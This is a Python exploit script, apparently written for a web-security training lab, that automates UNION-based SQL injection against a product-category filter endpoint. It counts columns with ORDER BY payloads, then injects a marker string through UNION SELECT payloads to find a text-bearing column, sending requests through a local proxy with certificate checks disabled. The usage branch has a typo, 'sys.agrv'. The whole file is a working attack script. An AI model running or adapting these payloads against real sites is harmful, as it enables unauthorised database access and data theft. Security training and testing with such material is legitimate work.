import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://10.0.2.5:8080', 'https' : 'http://10.0.2.5:8080'}

def exploit_sqli_num_columns(url):
	uri = '/filter?category=Gifts'
	for i in range (1,50):
		payload = "' order by %s --" % i
		r = requests.get(url + uri + payload, verify = False, proxies = proxies)
		if "Internal Server Error" in r.text:
			return i-1
	return False

def exploit_sqli_add_text(num_col):
	arr = []
	for i in range(0,num_col):
		arr.append('NULL')
	for i in range(0,num_col):
		arr[i] = "'3EZwrc'" # Target text to be inserted
		arr_result = exploit_sqli_payload(arr, i)
		if arr_result:
			return True
		arr[i] = 'NULL'
	return False

def exploit_sqli_payload(arr, col):
	uri = '/filter?category=Gifts'
	payload = "' union select"
	comma = False # Used to avoid "select,"
	for i in range(len(arr)):
		if comma:
			payload = payload + ', ' + arr[i]
		else:
			payload = payload + ' ' + arr[i]
			comma = True
	payload = payload + ' --'
	r = requests.get(url + uri + payload, verify = False, proxies = proxies)
	if 'Internal Server Error' in r.text:
		return False
	print('[+] Payload:', payload)
	print('[+] Index of column that contains target:', col)
	return True

if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[-] Usage: %s <url>' % sys.agrv[0])
		print('[-] Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)

	num_col = exploit_sqli_num_columns(url)
	print('[+] Number of Columns:', num_col) # debug
	if exploit_sqli_add_text(num_col):
		print('[+] SQLi Successful')
	else:
		print('[-] SQLi Unsuccessful')
